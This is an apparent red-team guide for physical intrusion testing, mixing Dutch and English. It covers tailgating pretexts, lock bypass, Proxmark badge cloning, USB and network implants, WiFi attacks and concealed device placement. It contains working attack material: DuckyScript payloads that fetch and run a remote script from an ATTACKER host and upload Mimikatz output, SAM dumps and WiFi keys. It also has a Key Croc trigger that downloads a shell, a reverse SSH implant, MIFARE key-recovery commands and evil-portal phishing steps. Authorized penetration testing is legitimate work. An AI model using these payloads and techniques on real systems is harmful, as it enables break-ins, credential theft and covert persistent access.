# XPOSE SECURITY — PHYSICAL INTRUSION GUIDE
## Red Team Physical Security Assessment

**Classificatie:** STRIKT VERTROUWELIJK — OPERATOR LEVEL  
**Versie:** 1.0 | Januari 2026

---

# INHOUDSOPGAVE

1. [Physical Security Fundamentals](#1-physical-security-fundamentals)
2. [Reconnaissance & Planning](#2-reconnaissance--planning)
3. [Social Engineering Entry](#3-social-engineering-entry)
4. [Lock Bypass Techniques](#4-lock-bypass-techniques)
5. [Badge/RFID Cloning](#5-badgerfid-cloning)
6. [USB Attack Devices](#6-usb-attack-devices)
7. [Wireless Attack Tools](#7-wireless-attack-tools)
8. [Post-Entry Operations](#8-post-entry-operations)
9. [OPSEC & Legal Considerations](#9-opsec--legal-considerations)
10. [Equipment Checklist](#10-equipment-checklist)

---

# XPOSE PHYSICAL TOOLKIT

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    XPOSE PHYSICAL ATTACK ARSENAL                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  USB ATTACK DEVICES                                                         │
│  ├── Rubber Ducky (HID Injection)                                           │
│  ├── O.MG Cable (Covert HID)                                                │
│  ├── USB Armory / Croc (Network Implant)                                    │
│  └── USB Croc (Keylogger/Implant)                                           │
│                                                                             │
│  WIRELESS TOOLS                                                             │
│  ├── ESP32 Marauder (WiFi/BT attacks)                                       │
│  ├── M5Stack (Multi-purpose)                                                │
│  └── WiFi Pineapple / Similar                                               │
│                                                                             │
│  NETWORK IMPLANTS                                                           │
│  ├── LAN Turtle                                                             │
│  ├── Shark Jack / Packet Squirrel                                           │
│  └── Bailey Shark (Network tap)                                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

# 1. PHYSICAL SECURITY FUNDAMENTALS

## 1.1 Physical Security Kill Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    PHYSICAL INTRUSION PHASES                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  RECON               PLANNING            ENTRY              POST-ENTRY      │
│  ┌──────────┐        ┌──────────┐        ┌──────────┐      ┌──────────┐   │
│  │ Observe  │───────►│ Identify │───────►│ Gain     │─────►│ Achieve  │   │
│  │ Target   │        │ Entry    │        │ Access   │      │ Objective│   │
│  │          │        │ Points   │        │          │      │          │   │
│  └──────────┘        └──────────┘        └──────────┘      └──────────┘   │
│       │                   │                   │                  │         │
│       ▼                   ▼                   ▼                  ▼         │
│  • Building layout   • Door types        • Tailgate        • Plant device │
│  • Entry points      • Lock types        • Badge clone     • Access data  │
│  • Guard schedules   • Camera coverage   • Social eng.     • Document     │
│  • Employee habits   • Escape routes     • Lock bypass     • Exit clean   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

> **📘 SENIOR INSIGHT:**
> **Physical pentesting is HIGH RISK:**
> - Je kunt worden aangehouden
> - GET-OUT-OF-JAIL letter ALTIJD bij je hebben
> - Emergency contact 24/7 beschikbaar
> - Weet wanneer je moet stoppen

---

## 1.2 Authorization Requirements

```yaml
VEREISTE DOCUMENTATIE:

Get-Out-of-Jail Letter:
  - Ondertekend door bevoegde persoon (C-level, Facility Manager)
  - Specifieke locaties genoemd
  - Datums en tijden
  - Foto + ID van tester
  - 24/7 verificatie telefoonnummer
  - Bedrijfsstempel

Rules of Engagement:
  - Welke gebouwen/ruimtes in scope
  - Expliciet out-of-scope (serverruimtes, kluizen, etc.)
  - Toegestane technieken (tailgating, lockpicking, social eng.)
  - Verboden acties (schade, echte diefstal)
  - Escalatieproces

Contact Informatie:
  - Primary contact (dag)
  - Emergency contact (24/7)
  - Security/Bewaking contact (voor deconfliction)
```

---

# 2. RECONNAISSANCE & PLANNING

## 2.1 External Reconnaissance

```yaml
Online Reconnaissance:
  Google Maps/Earth:
    - Building layout
    - Entry points
    - Parking
    - Satellite imagery (roof access?)
    
  Street View:
    - Door types
    - Camera locations
    - Guard stations
    - Smoker areas
    
  LinkedIn:
    - Employee names
    - Job titles
    - Building photos (badges visible?)
    - Org structure
    
  Company Website:
    - Office locations
    - Building photos
    - Visitor information
    - Press releases (expansions, moves)

Physical Reconnaissance:
  Walk-by:
    - Entry/exit points
    - Camera coverage
    - Guard presence
    - Employee behavior
    - Smoking areas (tailgate opportunity)
    - Deliveries timing
    
  Drive-by:
    - Parking security
    - Perimeter fence
    - Loading docks
    - Emergency exits
```

---

## 2.2 Identifying Entry Points

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    COMMON ENTRY POINTS                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  PRIMARY ENTRANCES                                                          │
│  ├── Main lobby (receptionist, badge required)                              │
│  ├── Employee entrance (badge only, no guard)                               │
│  └── Parking garage entrance (badge or tailgate)                            │
│                                                                             │
│  SECONDARY ENTRANCES                                                        │
│  ├── Smoking area door (often propped open)                                 │
│  ├── Loading dock (delivery pretext)                                        │
│  ├── Fire exits (alarmed but sometimes disabled)                            │
│  └── Roof access (via adjacent building)                                    │
│                                                                             │
│  OFTEN OVERLOOKED                                                           │
│  ├── Stairwell doors (frequently unlocked from inside)                      │
│  ├── Cafeteria/Canteen (external vendor access)                             │
│  ├── Gym/Fitness center (separate entry)                                    │
│  └── Maintenance access (service personnel)                                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

# 3. SOCIAL ENGINEERING ENTRY

## 3.1 Tailgating Techniques

```yaml
Classic Tailgate:
  Setup:
    - Arrive during busy times (8:30-9:00, 12:00-13:00)
    - Dress appropriately (business casual)
    - Carry props (coffee, laptop bag, phone to ear)
    - Look like you belong
    
  Execution:
    - Wait for employee at badge door
    - Time your approach to arrive just behind them
    - Look at phone, appear distracted
    - If door held: "Thanks!" and walk through
    - If challenged: "Oh, I forgot my badge upstairs"
    
  Variations:
    - "Hands full" (carrying boxes, coffee tray)
    - "Phone call" (appear on important call)
    - "Following crowd" (during shift change)

Smoking Area Tailgate:
  - Observe smoking area from distance
  - Note which door they use
  - Time their breaks
  - Join them, make small talk
  - Follow back inside ("I'm new, still waiting for my badge")
```

---

## 3.2 Pretext Scenarios

```yaml
IT Support:
  Props: Laptop bag, USB drives, "IT Support" badge (fake)
  Story: "I'm from corporate IT, here to update some workstations"
  Target: Any employee who will let you at a computer
  Danger: May be asked to verify with IT department

Delivery Person:
  Props: Clipboard, box/package, uniform if possible
  Story: "I have a delivery for [Name from LinkedIn]"
  Target: Reception, loading dock
  Benefit: Often waved through without much scrutiny

Vendor/Contractor:
  Props: Tool bag, safety vest, hard hat
  Story: "Here to check the [HVAC/Fire system/Network]"
  Target: Maintenance staff, building management
  Benefit: Wide access expected

Job Candidate:
  Props: Resume, professional attire
  Story: "I have an interview with [Real HR person]"
  Target: Reception
  Benefit: May be left alone in conference room

Building Inspector:
  Props: Clipboard, camera, official-looking badge
  Story: "Routine safety inspection"
  Target: Facility management
  Danger: May be escorted throughout
```

> **📘 SENIOR INSIGHT:**
> **Beste pretexts:**
> - Hebben een reden om overal te zijn
> - Zijn moeilijk te verifiëren
> - Passen bij je uiterlijk en gedrag
>
> **Test je pretext:** Zou JIJ dit geloven?

---

# 4. LOCK BYPASS TECHNIQUES

## 4.1 Common Lock Types

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    LOCK TYPES & BYPASS METHODS                              │
├──────────────────┬──────────────────────────────────────────────────────────┤
│ Lock Type        │ Bypass Methods                                           │
├──────────────────┼──────────────────────────────────────────────────────────┤
│ Pin Tumbler      │ Picking, bumping, impressioning                          │
│ Wafer Lock       │ Jiggling, rake picking                                   │
│ Tubular Lock     │ Tubular pick, impressioning                              │
│ Disc Detainer    │ Specialized picks, decoding                              │
│ Electronic       │ Bypass, known vulnerabilities, badge clone               │
│ Magnetic         │ Strong magnet (some models)                              │
│ Combination      │ Manipulation, bypass                                      │
│ Padlock          │ Shimming, cutting, picking                               │
└──────────────────┴──────────────────────────────────────────────────────────┘
```

---

## 4.2 Basic Lock Picking

```yaml
Pin Tumbler Picking:
  Tools:
    - Tension wrench (various sizes)
    - Hook pick
    - Rake (Bogota, city rake)
    - Diamond pick
    
  Single Pin Picking (SPP):
    1. Insert tension wrench, apply light pressure
    2. Insert hook pick
    3. Feel for binding pin
    4. Push binding pin up until it sets
    5. Repeat for remaining pins
    6. Turn cylinder with tension wrench
    
  Raking:
    1. Insert tension wrench, light pressure
    2. Insert rake pick
    3. Scrub in and out while applying tension
    4. Vary pressure and speed
    5. May need multiple attempts

  Practice:
    - Start with see-through practice locks
    - Graduate to real locks
    - Time yourself
    - Goal: Consistent opens in <60 seconds
```

---

## 4.3 Door Bypass Techniques

```yaml
Under-Door Tool:
  Description: Flexible tool to reach under door, pull handle from inside
  Works on: Lever handles, paddle handles
  Doesn't work: Knob handles, double-cylinder locks
  
Latch Slipping:
  Tools: Credit card, shim tool, latch bypass tool
  Works on: Spring latches without deadbolt
  Technique: Insert between door and frame, push latch back
  
Hinge Removal:
  Works on: Doors with hinges on accessible side
  Technique: Remove hinge pins, pull door from frame
  Limitation: Most secure doors have security hinges
  
Request-to-Exit Bypass:
  Description: Trigger motion sensor or REX button from outside
  Tools: Wire under door, balloon, heat source
  Works on: Doors with motion-activated REX
  
Mag Lock Bypass:
  Tools: Strong magnet, power interruption
  Some mag locks: Fail-safe (open when power cut)
  Others: Fail-secure (stay locked)
```

> **📘 SENIOR INSIGHT:**
> **Lock bypass reality:**
> - Picking is slower than movies show
> - Bypass is often faster than picking
> - Social engineering often easier than both
> - Document your entry method for report

---

# 5. BADGE/RFID CLONING

## 5.1 RFID Technology Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    RFID BADGE TECHNOLOGIES                                  │
├──────────────────┬─────────────┬────────────────────────────────────────────┤
│ Technology       │ Frequency   │ Security Level                             │
├──────────────────┼─────────────┼────────────────────────────────────────────┤
│ 125 kHz (LF)     │ Low         │ VERY LOW - Easily cloned                   │
│ - HID ProxCard   │             │ No encryption, UID only                    │
│ - EM4100         │             │                                            │
│ - AWID           │             │                                            │
├──────────────────┼─────────────┼────────────────────────────────────────────┤
│ 13.56 MHz (HF)   │ High        │ VARIES - Some cloneable                    │
│ - MIFARE Classic │             │ Weak crypto, cloneable                     │
│ - MIFARE DESFire │             │ Strong crypto, harder to clone             │
│ - HID iCLASS     │             │ Some versions vulnerable                   │
├──────────────────┼─────────────┼────────────────────────────────────────────┤
│ iCLASS SE        │ Multiple    │ HIGH - Rolling codes, encryption           │
│ SEOS             │             │                                            │
└──────────────────┴─────────────┴────────────────────────────────────────────┘
```

---

## 5.2 Badge Cloning with Proxmark

```bash
# === PROXMARK3 BADGE CLONING ===

# Identify card type
proxmark3> lf search
# Or for HF:
proxmark3> hf search

# === 125 kHz (HID ProxCard, EM4100) ===

# Read card
proxmark3> lf hid reader

# Output example:
# HID Prox TAG ID: 2006xxxxxx (26 bit)
# Facility Code: 123
# Card Number: 45678

# Clone to T5577 card
proxmark3> lf hid clone 2006xxxxxx

# For EM4100:
proxmark3> lf em 410x reader
proxmark3> lf em 410x clone [ID]

# === 13.56 MHz (MIFARE Classic) ===

# Check for MIFARE Classic
proxmark3> hf mf info

# Nested attack (if one key is default)
proxmark3> hf mf nested 1 0 A FFFFFFFFFFFF d

# Darkside attack (if all keys unknown)
proxmark3> hf mf darkside

# Once keys recovered, dump card:
proxmark3> hf mf dump

# Clone to blank MIFARE card:
proxmark3> hf mf restore

# === MAGIC MIFARE CARDS ===
# Special cards with writable Block 0 (UID)

# Write UID to magic card:
proxmark3> hf mf csetuid [UID]

# Full clone:
proxmark3> hf mf cload dump.eml
```

> **📘 SENIOR INSIGHT:**
> **Badge cloning success factors:**
> - Identify card type first
> - 125 kHz = almost always cloneable
> - MIFARE Classic = usually cloneable
> - DESFire/SEOS = very difficult
>
> **Tip:** Koop een kaartenpakket met diverse blanks

---

## 5.3 Long-Range Badge Reading

```yaml
Long-Range Reader Setup:
  Equipment:
    - Proxmark3 or custom reader
    - Extended antenna (DIY or commercial)
    - Hidden enclosure (backpack, briefcase)
    - Battery pack
    
  125 kHz Long Range:
    - Standard: ~10cm read range
    - Extended antenna: Up to 50cm+
    - Target: Employee badge in pocket, bag, lanyard
    
  13.56 MHz Long Range:
    - Harder due to frequency
    - ~15-20cm max with extended antenna
    - NFC shields defeat this

Covert Reading Scenarios:
  - Stand behind target in elevator
  - Bump into target (excuse: phone distraction)
  - Sit next to target in cafeteria
  - Walk closely behind in hallway
```

---

# 6. USB ATTACK DEVICES

## 6.1 Rubber Ducky

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    HAK5 RUBBER DUCKY                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  WHAT IT DOES:                                                              │
│  • Appears as USB keyboard to computer                                      │
│  • Types pre-programmed keystrokes at superhuman speed                      │
│  • Can execute any command user could type                                  │
│                                                                             │
│  USE CASES:                                                                 │
│  • Reverse shell in seconds                                                 │
│  • Credential theft                                                         │
│  • Data exfiltration                                                        │
│  • System configuration changes                                             │
│                                                                             │
│  LIMITATIONS:                                                               │
│  • Visible USB device                                                       │
│  • May be blocked by USB policies                                           │
│  • Locked workstations = limited use                                        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Rubber Ducky Payloads (DuckyScript)

```bash
# === REVERSE SHELL PAYLOAD ===
# Opens PowerShell, downloads and executes payload

DELAY 2000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"
ENTER

# === CREDENTIAL THEFT ===
# Uses Mimikatz to dump and exfil credentials

DELAY 2000
GUI r
DELAY 500
STRING powershell -ep bypass
ENTER
DELAY 1000
STRING $m = (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1'); IEX $m; Invoke-Mimikatz | Out-File C:\Windows\Temp\creds.txt
ENTER
DELAY 5000
STRING (New-Object Net.WebClient).UploadFile('http://ATTACKER/upload', 'C:\Windows\Temp\creds.txt')
ENTER

# === WIFI PASSWORD EXTRACTION ===

DELAY 2000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING netsh wlan export profile folder=C:\Windows\Temp key=clear
ENTER
DELAY 1000
STRING powershell -Command "(New-Object Net.WebClient).UploadFile('http://ATTACKER/upload', 'C:\Windows\Temp\wifi.xml')"
ENTER

# === SAM DATABASE DUMP ===

DELAY 2000
GUI r
DELAY 500
STRING powershell -ep bypass Start-Process powershell -ArgumentList '-Command "reg save HKLM\SAM C:\Windows\Temp\sam; reg save HKLM\SYSTEM C:\Windows\Temp\system"' -Verb RunAs
ENTER
DELAY 1000
ALT y
DELAY 3000
STRING powershell -Command "Compress-Archive -Path C:\Windows\Temp\sam,C:\Windows\Temp\system -DestinationPath C:\Windows\Temp\dump.zip; (New-Object Net.WebClient).UploadFile('http://ATTACKER/upload', 'C:\Windows\Temp\dump.zip')"
ENTER
```

> **📘 SENIOR INSIGHT:**
> **Rubber Ducky tips:**
> - Test payload VOORAF op identiek systeem
> - DELAY waarden afhankelijk van systeemsnelheid
> - UAC prompts vereisen menselijke interactie
> - Combineer met social engineering

---

## 6.2 O.MG Cable

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    O.MG CABLE                                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  WHAT IT IS:                                                                │
│  • Looks like normal USB/Lightning cable                                    │
│  • Contains hidden HID injection hardware                                   │
│  • WiFi enabled for remote triggering                                       │
│                                                                             │
│  CAPABILITIES:                                                              │
│  • All Rubber Ducky functionality                                           │
│  • Remote triggering via WiFi                                               │
│  • Geofencing (trigger when in range of specific WiFi)                      │
│  • Self-destruct (erase payload)                                            │
│  • Keylogging                                                               │
│                                                                             │
│  DEPLOYMENT SCENARIOS:                                                      │
│  • "Lost" cable left in parking lot/lobby                                   │
│  • Replace existing cable at target's desk                                  │
│  • "Borrow" scenario (can I charge my phone?)                               │
│  • Gift/Swag at conference                                                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### O.MG Cable Deployment

```yaml
Setup:
  1. Connect to O.MG cable's WiFi AP
     SSID: O.MG-XXXXX
     Password: (default or configured)
  
  2. Access web interface: http://192.168.4.1
  
  3. Configure payload (same as Rubber Ducky)
  
  4. Set trigger:
     - Immediate (on plug-in)
     - Remote (via WiFi)
     - Geofence (when specific SSID detected)
     - Timed

Payloads - Same as Rubber Ducky plus:
  
  # Keylogger Mode
  - Enable keylogging on web interface
  - All keystrokes stored
  - Retrieve via WiFi
  
  # Remote Trigger
  - Leave cable at target desk
  - Return to WiFi range when ready
  - Trigger payload remotely
  - Exfil data via callback

Stealth Considerations:
  - Disable status LED
  - Configure self-destruct on detection
  - Use geofence to only activate inside building
  - Match cable type to target (USB-C, Lightning, etc.)
```

> **📘 SENIOR INSIGHT:**
> **O.MG is STEALTH KING:**
> - Onherkenbaar van normale kabel
> - Kan weken/maanden passief wachten
> - Remote activation = perfect timing
> - Keylogging = capture credentials over tijd

---

## 6.3 USB Croc / LAN Turtle Style Implants

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    USB/NETWORK IMPLANTS                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  KEY CROC (Keylogger Implant):                                              │
│  ├── Inline between keyboard and computer                                   │
│  ├── Logs all keystrokes                                                    │
│  ├── Pattern matching (trigger on specific input)                           │
│  ├── WiFi exfiltration                                                      │
│  └── Payload injection capability                                           │
│                                                                             │
│  LAN TURTLE (Network Implant):                                              │
│  ├── Inline between computer and network                                    │
│  ├── Man-in-the-middle                                                      │
│  ├── SSH reverse shell                                                      │
│  ├── Network scanning                                                       │
│  └── DNS spoofing                                                           │
│                                                                             │
│  SHARK JACK / PACKET SQUIRREL:                                              │
│  ├── Quick network reconnaissance                                           │
│  ├── Packet capture                                                         │
│  ├── Network implant                                                        │
│  └── VPN tunnel back to attacker                                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### USB Implant Deployment

```bash
# === KEY CROC DEPLOYMENT ===

# 1. Configure before deployment
# Connect to Key Croc WiFi, access web interface

# 2. Set up keylogger
# Edit /root/udisk/config.txt

# Payload: Log everything to file
MATCH .

# Payload: Trigger on specific pattern
MATCH p@ssw0rd
RUN POWERSHELL "IEX(IWR http://attacker/shell.ps1)"

# 3. Physical installation
# - Unplug keyboard
# - Insert Key Croc
# - Plug keyboard into Key Croc
# - Device is inline, invisible to user

# === LAN TURTLE DEPLOYMENT ===

# 1. Configure SSH reverse shell
# Edit /root/udisk/payloads/library/reverse-ssh/

# 2. Physical installation
# - Unplug network cable from computer
# - Insert LAN Turtle
# - Plug network cable into LAN Turtle
# - Device is inline, invisible to user

# 3. Access via reverse shell
ssh root@attacker -p 2222

# Now you have:
# - Network access from inside
# - Man-in-the-middle position
# - Persistent foothold
```

---

## 6.4 Bailey Shark / Network Tap

```yaml
Bailey Shark / Throwing Star LAN Tap:
  
  What it is:
    - Passive network tap
    - No power required
    - No MAC address
    - Completely invisible on network
  
  Use case:
    - Capture network traffic
    - Sniff credentials
    - Map network
    - No risk of detection
  
  Installation:
    1. Disconnect network cable
    2. Insert tap inline
    3. Connect capture device to tap
    4. Reconnect network cable
  
  Capture:
    - Laptop with Wireshark
    - Or: Leave recording device
  
  Limitations:
    - Receive only (can't inject)
    - Full duplex requires two capture ports
    - 10/100 Mbps only (most models)
```

---

# 7. WIRELESS ATTACK TOOLS

## 7.1 ESP32 Marauder

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    ESP32 MARAUDER CAPABILITIES                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  WIFI ATTACKS:                                                              │
│  ├── Beacon Spam (create fake access points)                                │
│  ├── Deauthentication attacks                                               │
│  ├── Probe request sniffing                                                 │
│  ├── PMKID capture                                                          │
│  ├── Evil Portal (captive portal phishing)                                  │
│  └── Handshake capture                                                      │
│                                                                             │
│  BLUETOOTH ATTACKS:                                                         │
│  ├── BLE scanning                                                           │
│  ├── Device tracking                                                        │
│  └── Spam attacks                                                           │
│                                                                             │
│  RECON:                                                                     │
│  ├── AP scanning                                                            │
│  ├── Client scanning                                                        │
│  ├── Packet sniffing                                                        │
│  └── Signal strength mapping                                                │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### ESP32 Marauder Operations

```yaml
WiFi Scanning:
  1. Power on Marauder
  2. Select: Scan > Scan APs
  3. View discovered networks
  4. Note: SSID, BSSID, Channel, Security

Deauth Attack (DoS):
  # Force clients to reconnect (capture handshake)
  1. Select target AP
  2. Sniff > Deauth Attack
  3. Clients disconnect
  4. They reconnect = handshake captured

PMKID Capture:
  # Capture PMKID for offline cracking
  1. Sniff > Probe Request
  2. Or: Sniff > PMKID
  3. Save to SD card
  4. Crack offline with hashcat

Evil Portal:
  # Captive portal phishing
  1. Select: Evil Portal
  2. Choose template (login page)
  3. Start AP with portal
  4. Victims connect, see fake login
  5. Credentials captured

Beacon Spam:
  # Create many fake APs
  1. Select: Beacon Spam
  2. Options:
     - Random SSIDs
     - Rickroll SSIDs
     - Custom list
  3. Floods area with fake networks
  4. Use: Distraction, confusion, testing
```

> **📘 SENIOR INSIGHT:**
> **ESP32 Marauder is COMPACT & POWERFUL:**
> - Fits in pocket
> - Battery powered
> - No laptop needed
> - Immediate WiFi intelligence

---

## 7.2 M5Stack Operations

```yaml
M5Stack Capabilities:
  
  With Marauder Firmware:
    - Same as ESP32 Marauder
    - Built-in screen for interface
    - Buttons for navigation
    - Battery included
  
  With CardPuter/StickC:
    - RFID reading/cloning
    - IR blasting
    - SubGHz (garage doors, remotes)
    - WiFi attacks
  
  Common Uses:
    - Quick WiFi recon
    - Badge cloning (with RFID module)
    - IR replay (TVs, projectors, AC)
    - Signal analysis

RFID Operations (with module):
  # Read card
  1. Select RFID > Read
  2. Hold card near device
  3. Card data displayed
  
  # Save card
  1. After reading, select Save
  2. Card saved to SD
  
  # Emulate card
  1. Load saved card
  2. Select Emulate
  3. Hold device to reader
```

---

# 8. POST-ENTRY OPERATIONS

## 8.1 After Gaining Physical Access

```yaml
Immediate Actions:
  1. Note entry time and method
  2. Assess environment (cameras, guards, employees)
  3. Identify safe working area
  4. Plan exit route

High-Value Targets:
  Unlocked Workstations:
    - Rubber Ducky payload
    - Quick credential grab
    - Plant O.MG cable
  
  Server Room:
    - Network tap (Bailey Shark)
    - Implant (LAN Turtle)
    - Photo of labels/configs
  
  Printer/MFP:
    - Check for stored documents
    - Extract address book
    - Note network config
  
  Conference Rooms:
    - Check for documents
    - Note network drops
    - Video conferencing creds
  
  Desk Areas:
    - Post-it passwords
    - Documents
    - Badges left behind

Evidence Collection:
  - Photos of security gaps
  - Screenshots of accessed systems
  - Logs of planted devices
  - Timeline of activities
```

---

## 8.2 Device Placement Strategy

```yaml
USB Devices:
  Rubber Ducky:
    - Unlocked workstation
    - Quick in-and-out
    - Immediate payload execution
  
  O.MG Cable:
    - Replace existing cable
    - Leave as "lost" cable
    - Near target's desk
  
  Key Croc:
    - Behind workstation
    - Under desk
    - Long-term capture

Network Devices:
  LAN Turtle:
    - Behind workstation
    - In wiring closet
    - Near switch
  
  Network Tap:
    - Wiring closet
    - Under floor tiles
    - Behind equipment
  
  WiFi Implant:
    - Hidden location with power
    - Behind furniture
    - In ceiling tiles

Concealment:
  - Use existing cable runs
  - Behind equipment
  - In power strips
  - Under floor/above ceiling
  - Label as legitimate (network maintenance)
```

---

# 9. OPSEC & LEGAL CONSIDERATIONS

## 9.1 Physical Red Team OPSEC

```yaml
Before Entry:
  - Verify authorization is current
  - Carry Get-Out-of-Jail letter
  - Test emergency contact number
  - Dress appropriately
  - Remove identifying items
  - Prepare cover story
  - Know exit routes

During Operation:
  - Act like you belong
  - Don't linger unnecessarily
  - If questioned, use cover story
  - If pressed, reveal authorization
  - Don't argue with security
  - Document everything

If Confronted:
  1. Stay calm
  2. "I'm authorized to be here"
  3. Offer to show documentation
  4. Ask to call authorized contact
  5. Do NOT run
  6. Do NOT lie to law enforcement
  
If Detained:
  1. Remain calm and cooperative
  2. State: "I'm conducting authorized security testing"
  3. Provide Get-Out-of-Jail letter
  4. Request they call verification number
  5. Do not provide details without contact approval
  6. Do not consent to searches
```

---

# 10. EQUIPMENT CHECKLIST

## 10.1 XPOSE Physical Kit

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    XPOSE PHYSICAL PENTESTING KIT                               ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  DOCUMENTATION (Always Carry)                                                 ║
║  ☐ Get-Out-of-Jail letter (original + copies)                                 ║
║  ☐ Personal ID                                                                ║
║  ☐ Emergency contact card                                                     ║
║  ☐ ROE summary                                                                ║
║                                                                               ║
║  USB DEVICES                                                                  ║
║  ☐ Rubber Ducky (with tested payloads)                                        ║
║  ☐ O.MG Cable (various types: USB-C, Lightning, Micro-USB)                    ║
║  ☐ USB Croc / Key Croc                                                        ║
║  ☐ Blank USB drives (for drops)                                               ║
║                                                                               ║
║  NETWORK DEVICES                                                              ║
║  ☐ Bailey Shark / LAN Tap                                                     ║
║  ☐ LAN Turtle / Packet Squirrel                                               ║
║  ☐ Shark Jack                                                                 ║
║  ☐ Ethernet cables (various lengths)                                          ║
║                                                                               ║
║  WIRELESS TOOLS                                                               ║
║  ☐ ESP32 Marauder                                                             ║
║  ☐ M5Stack                                                                    ║
║  ☐ WiFi Pineapple (if available)                                              ║
║  ☐ Proxmark3 (badge cloning)                                                  ║
║  ☐ Blank RFID cards (125kHz, 13.56MHz)                                        ║
║                                                                               ║
║  LOCK TOOLS (If authorized)                                                   ║
║  ☐ Lock pick set                                                              ║
║  ☐ Tension wrenches                                                           ║
║  ☐ Bump keys                                                                  ║
║  ☐ Bypass tools                                                               ║
║                                                                               ║
║  GENERAL                                                                      ║
║  ☐ Laptop (charged)                                                           ║
║  ☐ Phone (charged)                                                            ║
║  ☐ Camera                                                                     ║
║  ☐ Notepad + pen                                                              ║
║  ☐ Flashlight                                                                 ║
║  ☐ Multi-tool                                                                 ║
║  ☐ Props for pretext                                                          ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

**EINDE PHYSICAL INTRUSION GUIDE**

---

*Dit document bevat gevoelige physical security assessment technieken.*
*ALTIJD opereren binnen de grenzen van de ROE.*
*ALTIJD Get-Out-of-Jail documentatie bij je hebben.*
*Bij twijfel: STOP en neem contact op met je team lead.*

